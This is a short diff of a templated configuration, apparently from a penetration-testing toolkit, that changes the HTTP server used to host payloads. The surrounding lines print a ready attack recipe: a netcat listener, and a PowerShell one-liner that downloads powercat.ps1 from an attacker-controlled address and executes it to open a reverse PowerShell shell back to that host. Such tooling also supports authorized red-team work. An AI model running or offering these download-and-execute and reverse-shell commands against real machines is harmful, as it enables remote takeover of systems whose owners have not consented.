@@ -17,4 +17,4 @@ content: |
   echo 'Preparation 1: nc -lvnp <%=$(esh variables/shell_port)%>'; \
   echo 'Deliver + Execute: powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/powercat.ps1\');powercat -c <%=$(esh variables/attacker_ip)%> -p <%=$(esh variables/shell_port)%> -e powershell'; \
   echo '================================================================'; \
-  python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
